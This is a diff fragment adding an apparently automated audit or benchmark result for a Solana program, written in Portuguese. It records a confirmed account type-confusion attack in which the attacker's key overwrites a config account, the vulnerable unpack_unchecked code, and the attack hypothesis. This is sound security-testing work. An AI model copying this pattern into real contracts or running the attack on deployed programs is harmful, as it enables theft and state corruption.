+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 14767 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 14848 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: primeiros 32 bytes da conta de config sobrescritos com a chave do atacante"
+    }
+  ],
+  "case_id": "HK-REINIT-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let mut user = User::unpack_unchecked(&user_data)?;\n...\nuser.authority = *authority_info.key;",
+    "explanation": "Os dados da conta sao desserializados manualmente via `unpack_unchecked` sem qualquer discriminador de tipo. Como `User` contem apenas um `Pubkey` (32 bytes), qualquer conta com pelo menos 32 bytes de dados pode ser interpretada como `User`, permitindo que uma conta de outro tipo/layout seja passada como `user_info` e tenha seus dados tratados como autoridade.",
+    "attack_hypothesis": "Um atacante fornece uma conta de outro tipo (por exemplo, uma conta de configuracao ou vault com layout diferente) como `user_info`; o programa a interpreta como `User` e sobrescreve os primeiros 32 bytes com a chave do atacante, corrompendo o estado de outra conta."
+  }
+}
